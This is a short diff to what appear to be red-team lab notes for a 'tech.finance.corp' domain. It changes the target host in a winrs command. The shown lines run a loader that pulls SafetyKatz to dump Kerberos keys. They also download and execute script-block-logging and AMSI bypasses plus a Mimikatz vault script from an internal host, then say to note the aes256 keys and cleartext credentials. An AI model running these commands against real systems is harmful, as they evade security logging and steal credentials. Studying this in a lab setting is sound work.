@@ -59,7 +59,7 @@ Download from local loopback
 ```powershell
 $null | winrs -r:mgmtsrv.tech.finance.corp "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::evasive-keys exit"
 
-$null | winrs -r:mgmtsrv.tech.finance.corp powershell -c "iex (iwr http://172.16.100.1/sbloggingbypass.txt -useb);iex (iwr http://172.16.100.1/amsibypass.txt -useb);iex (iwr http://172.16.100.1/Invoke-MimiEx-vault.ps1 -useb);"
+$null | winrs -r:techsrv30.tech.finance.corp powershell -c "iex (iwr http://172.16.100.1/sbloggingbypass.txt -useb);iex (iwr http://172.16.100.1/amsibypass.txt -useb);iex (iwr http://172.16.100.1/Invoke-MimiEx-vault.ps1 -useb);"
 ```
 
 Note down the `aes256_hmac` and the cleartext credentials 
